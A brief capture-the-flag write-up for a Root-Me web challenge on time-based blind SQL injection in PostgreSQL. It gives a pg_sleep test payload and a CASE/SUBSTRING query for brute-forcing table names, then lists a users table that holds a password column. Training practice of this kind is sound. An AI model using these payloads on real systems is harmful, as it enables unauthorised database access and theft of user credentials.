## Challenge name: SQL injection - Time-based

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)

**The database is PostgreSQL. Use time-based blind injection with `pg_sleep()`.**

**Test injection:**
```
1 AND pg_sleep(10)--
```

**Bruteforce table names, column names, and data:**
```
1 AND (SELECT CASE WHEN SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0), 1, 1) = 'a' THEN pg_sleep(5) ELSE 1 END)--
```

**Tables: `users` with columns: `id`, `username`, `firstname`, `lastname`, `email`, `password`**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
